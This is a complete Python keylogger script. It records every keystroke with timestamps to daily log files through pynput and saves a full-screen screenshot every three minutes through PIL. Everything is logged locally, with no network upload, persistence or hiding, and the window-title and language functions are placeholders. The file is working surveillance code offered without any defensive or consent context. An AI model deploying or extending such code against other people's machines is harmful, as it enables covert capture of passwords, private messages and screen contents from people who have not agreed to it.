import os
import threading
from datetime import datetime
from pynput.keyboard import Key, Listener
from PIL import ImageGrab

class KeyLogger:
    def __init__(self, log_dir="logs", screenshot_interval=180):
        self.log_dir = log_dir
        self.screenshot_interval = screenshot_interval
        self.current_log_file = self.get_log_file_path()

        # Ensure the log directory exists
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

    def get_log_file_path(self):
        current_date = datetime.now().strftime('%Y-%m-%d')
        return os.path.join(self.log_dir, f"keylog_{current_date}.txt")

    def get_active_window_title(self):
        # Placeholder function as win32gui is not available
        return "Unknown Window"

    def get_current_language(self):
        # Placeholder function as win32api is not available
        return "Unknown Language"

    def log_key_press(self, key):
        try:
            # Update the log file daily
            self.current_log_file = self.get_log_file_path()
            
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            active_window = self.get_active_window_title()
            current_language = self.get_current_language()
            log_entry = f"{current_time} | {active_window} | {current_language} | {key}\n"
            
            with open(self.current_log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception as e:
            print(f"Error in log_key_press: {e}")

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.log_key_press(key.char)
            else:
                self.log_key_press(str(key))
        except Exception as e:
            print(f"Error in on_press: {e}")

    def take_screenshot(self):
        while True:
            try:
                current_time = datetime.now().strftime('%Y-%m-%d_%H%M%S')
                screenshot_folder = os.path.join(self.log_dir, datetime.now().strftime('%Y-%m-%d'))
                
                # Ensure the screenshot folder exists
                if not os.path.exists(screenshot_folder):
                    os.makedirs(screenshot_folder)

                screenshot_path = os.path.join(screenshot_folder, f"screenshot_{current_time}.png")
                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path)
            except Exception as e:
                print(f"Error in take_screenshot: {e}")
            threading.Event().wait(self.screenshot_interval)

    def start(self):
        # Start key listener
        listener = Listener(on_press=self.on_press)
        listener.start()

        # Start screenshot capture in a separate thread
        screenshot_thread = threading.Thread(target=self.take_screenshot)
        screenshot_thread.start()

        # Wait for listener and screenshot thread to finish
        listener.join()
        screenshot_thread.join()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
